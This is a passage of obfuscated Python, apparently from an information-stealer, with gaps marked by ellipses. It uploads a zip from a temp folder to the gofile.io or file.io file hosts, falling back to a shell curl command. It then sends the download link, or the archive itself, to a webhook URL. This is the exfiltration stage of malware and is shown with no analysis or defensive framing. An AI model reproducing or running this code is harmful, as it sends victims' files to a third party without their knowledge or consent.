...
def gofileupload(path):
	F='utf-8';E='downloadPage';D='https://api.gofile.io/getServer';B='data'
	try:G=requests.post(f"https://{requests.get(D).json()[B][_C]}.gofile.io/uploadFile",files={_D:open(path,'rb')}).json()[B][E];return G
	except Exception as A:
		error_Handler(A)
		try:
			try:C=loads(urlopen(D).read().decode(F))[B][_C]
			except Exception as A:error_Handler(A);C='store4'
			H=subprocess.Popen(f'curl -F "file=@{path}" https://{C}.gofile.io/uploadFile',shell=_A,stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate();return loads(H[0].decode(F))[B][E]
...
def fileioupload(path):
	try:
		with open(path,'rb')as A:B=requests.post('https://file.io/',files={_D:A})
		return B.json()['link']
...
if zip_size>20*1024*1024:
	zip_path=os.path.join(temp_folder,_E)
...
if link:content+=f"\nDownload link: {link}";response=requests.post(webhook_url,data={_F:content})
else:files={_D:(filename,zip_data)};data={_F:content};response=requests.post(webhook_url,files=files,data=data)
